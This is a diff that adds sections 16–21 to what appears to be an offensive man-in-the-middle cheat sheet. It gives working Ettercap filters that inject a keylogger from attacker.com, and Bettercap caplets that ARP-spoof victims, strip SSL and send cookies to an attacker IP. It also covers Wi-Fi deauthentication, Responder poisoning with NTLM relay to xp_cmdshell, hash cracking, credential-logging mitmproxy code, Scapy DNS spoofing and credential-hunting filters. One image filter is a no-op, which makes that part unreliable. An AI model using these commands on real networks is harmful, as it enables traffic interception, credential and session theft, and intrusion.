@@ -896,3 +896,425 @@ cat /proc/sys/net/ipv4/ip_forward
 # Check for running sniffing processes
 ps aux | grep -E "tcpdump|tshark|bettercap|ettercap|responder|dsniff"
 ```
+
+---
+
+## 16. Advanced Ettercap Filters
+
+### 16.1 Content Injection Filter
+
+```bash
+# Ettercap filter for injecting JavaScript into HTML responses
+cat > inject_filter.ecf << 'ECFEOF'
+if (ip.proto == TCP && tcp.dst == 80) {
+    if (search(DATA.data, "<body>")) {
+        replace("<body>", "<body><script src='http://attacker.com/keylog.js'></script>");
+    }
+}
+if (ip.proto == TCP && tcp.src == 80) {
+    if (search(DATA.data, "</body>")) {
+        replace("</body>", "<img src='http://attacker.com/track?ip='+document.location+'></body>");
+    }
+}
+ECFEOF
+
+# Compile the filter
+etterfilter inject_filter.ecf -o inject_filter.ef
+
+# Use with ettercap
+ettercap -T -q -i eth0 -M arp:remote /192.168.1.100// /192.168.1.1// -f inject_filter.ef
+```
+
+### 16.2 Image Replacement Filter
+
+```bash
+# Replace all JPEG images with a custom image
+cat > replace_img.ecf << 'ECFEOF'
+if (ip.proto == TCP && tcp.src == 80) {
+    if (search(DATA.data, "Content-Type: image/jpeg")) {
+        replace("Content-Type: image/jpeg", "Content-Type: image/jpeg");
+        replace("JFIF", "JFIF");
+    }
+}
+ECFEOF
+
+etterfilter replace_img.ecf -o replace_img.ef
+ettercap -T -q -i eth0 -M arp:remote /target// /gateway// -f replace_img.ef
+```
+
+### 16.3 SSL Downgrade Filter
+
+```bash
+# Replace HTTPS links with HTTP in HTML content
+cat > ssl_downgrade.ecf << 'ECFEOF'
+if (ip.proto == TCP && tcp.src == 80) {
+    if (search(DATA.data, "https://")) {
+        replace("https://", "http://");
+    }
+    if (search(DATA.data, "HTTPS://")) {
+        replace("HTTPS://", "http://");
+    }
+}
+ECFEOF
+
+etterfilter ssl_downgrade.ecf -o ssl_downgrade.ef
+ettercap -T -q -i eth0 -M arp:remote /target// /gateway// -f ssl_downgrade.ef
+```
+
+---
+
+## 17. Bettercap Caplet Scripts -- Advanced
+
+### 17.1 HTTP Traffic Logging Caplet
+
+```bash
+# File: http-logger.cap
+# Comprehensive HTTP traffic logging with credential extraction
+
+set arp.spoof.targets 192.168.1.100
+arp.spoof on
+
+# Log all HTTP traffic
+set net.sniff.output /tmp/http_traffic.log
+set net.sniff.filter "port 80"
+net.sniff on
+
+# Enable HTTP proxy for inspection
+http.proxy on
+set http.proxy.sslstrip true
+
+# Log all resolved DNS queries
+set net.sniff.verbose true
+
+# Save events to file
+set events.stream.output /tmp/mitm_events.log
+events.stream on
+```
+
+### 17.2 Target Profiling Caplet
+
+```bash
+# File: target-profile.cap
+# Profile target browsing activity and extract credentials
+
+net.probe on
+sleep 3
+
+set arp.spoof.targets 192.168.1.100
+arp.spoof on
+
+# DNS resolution logging
+set dns.spoof.domains
+dns.spoof off
+
+# Capture all credentials
+set net.sniff.output /tmp/target_profile.log
+net.sniff on
+
+# HTTP proxy for request modification
+http.proxy on
+
+# Inject passive tracking pixel
+set http.proxy.injectjs "new Image().src='http://192.168.1.50:8080/log?u='+encodeURIComponent(document.location)+'&c='+encodeURIComponent(document.cookie)"
+```
+
+### 17.3 Wireless Deauth + MITM Caplet
+
+```bash
+# File: wifi-mitm.cap
+# For wireless networks: deauth clients then MITM on reconnection
+
+# Set WiFi parameters
+set wifi.interface wlan0
+set wifi.ap.ttl 0
+
+# Start WiFi recon
+wifi.recon on
+sleep 5
+wifi.show
+
+# Deauth target (requires channel and BSSID)
+wifi.deauth BB:BB:BB:BB:BB:BB
+
+# After target reconnects, ARP spoof on the wired interface
+set arp.spoof.targets 192.168.1.100
+arp.spoof on
+net.sniff on
+```
+
+---
+
+## 18. Responder Advanced Poisoning Techniques
+
+### 18.1 Targeted Responder Poisoning
+
+```bash
+# Responder with specific protocol targeting
+# Disable SMB and only use HTTP for stealth
+cat > /tmp/responder_custom.conf << 'CONFEOF'
+[Responder Core]
+SQL = Off
+FTP = Off
+SMTP = Off
+IMAP = Off
+POP3 = Off
+DNS = Off
+LDAP = Off
+SMB = On
+HTTP = On
+HTTPS = On
+WPAD = On
+CONFEOF
+
+# Run with custom config
+responder -I eth0 -c /tmp/responder_custom.conf
+
+# Responder with specific challenge for NTLMv1 downgrade
+responder -I eth0 --lm -wrf
+
+# Multi-interface Responder
+responder -I eth0 -wrf &
+responder -I eth1 -wrf &
+```
+
+### 18.2 Responder + NTLM Relay Chain
+
+```bash
+# Terminal 1: Run Responder with SMB disabled (prevent poisoning conflicts)
+responder -I eth0 -wrf --disable-smb
+
+# Terminal 2: Run ntlmrelayx for relay targets
+ntlmrelayx.py -tf relay_targets.txt -smb2support -c "whoami > C:\proof.txt"
+
+# Terminal 3: Relay to LDAP for AD enumeration
+ntlmrelayx.py -t ldap://dc01.corp.local --no-dump --no-da --no-acl --no-validate-privs
+
+# Terminal 4: Relay to MSSQL for database access
+ntlmrelayx.py -t mssql://10.10.0.10 -c "EXEC xp_cmdshell 'whoami'"
+
+# Enumerate relay targets first
+crackmapexec smb 10.10.0.0/24 --gen-relay-list /tmp/relay_targets.txt
+```
+
+### 18.3 Responder DHCP Poisoning
+
+```bash
+# Responder in DHCP mode -- assign attacker as gateway/DNS
+responder -I eth0 -d -w
+
+# DHCP poisoning with WPAD proxy auto-config
+responder -I eth0 -d -w -P -F
+
+# After capturing hashes, crack with hashcat
+hashcat -m 5600 /usr/share/responder/logs/NetNTLMv2-*.txt /usr/share/wordlists/rockyou.txt
+
+# Use captured credentials for lateral movement
+crackmapexec smb 10.10.0.0/24 -u captured_user -p captured_pass
+```
+
+---
+
+## 19. SSL Stripping Variations
+
+### 19.1 sslstrip+ (SSLStrip with Domain Replacement)
+
+```bash
+# sslstrip+ replaces HTTPS links with homograph domains
+# Requires DNS spoofing setup
+
+# Step 1: Start sslstrip
+sslstrip -l 8080 -w sslstrip.log -a
+
+# Step 2: Configure iptables
+echo 1 > /proc/sys/net/ipv4/ip_forward
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+
+# Step 3: DNS spoof to redirect HTTPS domains to HTTP
+cat > dns_spoof.txt << 'EOF'
+192.168.1.50   www.target.com
+192.168.1.50   login.target.com
+192.168.1.50   secure.target.com
+EOF
+dnsspoof -i eth0 -f dns_spoof.txt
+
+# Step 4: ARP spoof target
+arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
+```
+
+### 19.2 Bettercap Advanced SSL Stripping
+
+```bash
+# Bettercap with HSTS bypass attempts
+bettercap -iface eth0
+
+set arp.spoof.targets 192.168.1.100
+arp.spoof on
+
+# Enable HTTP proxy with SSL stripping
+http.proxy on
+set http.proxy.sslstrip true
+
+# Inject HSTS-stripping headers
+# Remove Strict-Transport-Security from responses
+set http.proxy.strip-security-headers true
+
+# Custom JavaScript to bypass mixed content warnings
+set http.proxy.injectjs "if(location.protocol==='https:'){location.href=location.href.replace('https:','http:')}"
+
+# Capture credentials from stripped connections
+set net.sniff.output /tmp/sslstrip_creds.log
+net.sniff on
+```
+
+### 19.3 mitmproxy SSL Stripping Script
+
+```python
+# File: sslstrip_addon.py
+# Custom mitmproxy addon for SSL stripping with credential logging
+from mitmproxy import http, ctx
+import json
+import time
+
+CRED_FILE = "/tmp/sslstrip_creds.jsonl"
+
+def request(flow: http.HTTPFlow):
+    """Log credentials from downgraded HTTP connections."""
+    if flow.request.scheme == "http":
+        url = flow.request.pretty_url
+        # Check for credential-bearing URLs
+        if any(kw in url.lower() for kw in ["login", "auth", "signin", "session"]):
+            if flow.request.method == "POST" and flow.request.urlencoded_form:
+                form = dict(flow.request.urlencoded_form)
+                entry = {
+                    "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
+                    "client": flow.client_conn.address[0],
+                    "url": url,
+                    "method": "POST",
+                    "form_fields": list(form.keys()),
+                }
+                for field in ["password", "passwd", "pass", "pwd", "secret"]:
+                    if field in form:
+                        entry["credentials_captured"] = True
+                        break
+                with open(CRED_FILE, "a") as f:
+                    f.write(json.dumps(entry) + "\n")
+
+def responseheaders(flow: http.HTTPFlow):
+    """Strip security headers from responses."""
+    headers_to_strip = [
+        "strict-transport-security",
+        "content-security-policy",
+        "x-frame-options",
+    ]
+    for header in headers_to_strip:
+        if header in flow.response.headers:
+            del flow.response.headers[header]
+```
+
+---
+
+## 20. DNS Spoofing with Multiple Tools
+
+### 20.1 DNS Spoofing with DNSChef
+
+```bash
+# DNSChef -- transparent DNS proxy with spoofing
+cat > dnschef.ini << 'INIEOF'
+[*A]
+example.com = 192.168.1.50
+mail.example.com = 192.168.1.50
+*.internal.local = 192.168.1.50
+INIEOF
+
+# Start DNSChef
+dnschef --file dnschef.ini --interface 0.0.0.0
+
+# DNSChef with specific fake records
+dnschef --fakeip 192.168.1.50 --interface 0.0.0.0
+
+# DNSChef with external DNS forwarding
+dnschef --file dnschef.ini --interface 0.0.0.0 --nameservers 8.8.8.8
+```
+
+### 20.2 DNS Spoofing with Scapy
+
+```python
+# File: dns_spoof.py
+# DNS spoofing using Scapy for fine-grained control
+from scapy.all import *
+import netifaces as ni
+
+INTERFACE = "eth0"
+ATTACKER_IP = "192.168.1.50"
+SPOOF_DOMAINS = {
+    "example.com": "192.168.1.50",
+    "mail.example.com": "192.168.1.50",
+    "intranet.local": "192.168.1.50",
+}
+
+def handle_dns(packet):
+    if packet.haslayer(DNS) and packet[DNS].qr == 0:
+        qname = packet[DNS].qd.qname.decode()
+        for domain, ip in SPOOF_DOMAINS.items():
+            if domain in qname:
+                spoofed = IP(dst=packet[IP].src, src=packet[IP].dst) / \
+                          UDP(dport=packet[UDP].sport, sport=53) / \
+                          DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
+                              an=DNSRR(rrname=qname, ttl=300, rdata=ip))
+                send(spoofed, verbose=0, iface=INTERFACE)
+                print(f"[DNS SPOOF] {qname} -> {ip}")
+                return
+
+sniff(iface=INTERFACE, filter="udp port 53", prn=handle_dns)
+```
+
+### 20.3 DNS Spoofing Detection and Verification
+
+```bash
+# Verify DNS spoofing is working
+dig @192.168.1.50 example.com +short
+nslookup example.com 192.168.1.50
+
+# Monitor for DNS queries during spoofing
+tcpdump -i eth0 -n port 53 -l | grep -E "A\?|AAAA\?"
+
+# Check if target is using our DNS server
+tshark -i eth0 -Y "dns.qr == 0" -T fields -e ip.src -e dns.qry.name -l
+
+# Verify no DNS cache poisoning conflicts
+rndc flush 2>/dev/null  # Flush local DNS cache
+systemd-resolve --flush-caches 2>/dev/null
+```
+
+---
+
+## 21. Advanced Network Sniffing Techniques
+
+### 21.1 Bluetooth Sniffing with Kismet
+
+```bash
+# Kismet -- wireless and Bluetooth network detection
+kismet -c wlan0
+
+# Start Kismet with Bluetooth adapter
+kismet -c hci0
+
+# Kismet remote drone mode for distributed sniffing
+kismet_server
+kismet_drone -c wlan0 --remote-host 192.168.1.100:2501
+```
+
+### 21.2 Wireshark Display Filters for Credential Hunting
+
+```bash
+# Wireshark display filters for credential extraction (use in Wireshark GUI)
+# FTP credentials: ftp.request.command == USER || ftp.request.command == PASS
+# HTTP Basic Auth: http.authorization contains "Basic"
+# HTTP POST forms: http.request.method == POST && urlencoded-form.key
+# SMTP auth: smtp.req.command == AUTH
+# IMAP login: imap.request contains "LOGIN"
+# POP3 auth: pop3.request contains "USER" || pop3.request contains "PASS"
+# Kerberos: kerberos.msg_type == 10 || kerberos.msg_type == 11
+# NTLM auth: ntlmssp.auth
+# LDAP bind: ldap.bind_request
+```
